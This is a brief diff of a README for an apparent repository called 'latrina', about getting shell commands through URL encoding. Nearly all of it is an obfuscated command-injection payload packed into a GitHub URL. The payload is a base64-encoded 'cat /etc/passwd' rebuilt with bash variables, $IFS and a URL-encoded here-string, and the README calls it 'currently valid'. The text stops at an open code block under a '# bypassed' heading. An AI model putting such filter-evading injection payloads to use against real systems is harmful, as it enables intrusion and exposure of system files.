@@ -1,9 +1,11 @@
 # latrina
 bypass url encoding with nontrivial commands
 
-```
-wget https://github.com/kusky3/latrina/raw/main/;a=('Y2F0IC9ldGMvcGFzc3dkCg==');b=('base');c=$IFS;d=64;$($b$d$c-d$c<<<$a)
-```
+currently valid:
+https://github.com/kusky3/latrina/blob/main/;a=('Y2F0IC9ldGMvcGFzc3dkCg==');b=('base');c=$IFS;d=64;$($b$d$c-d$c%3C%3C%3C$a)
+
+
+
 # bypassed
 ```
 "
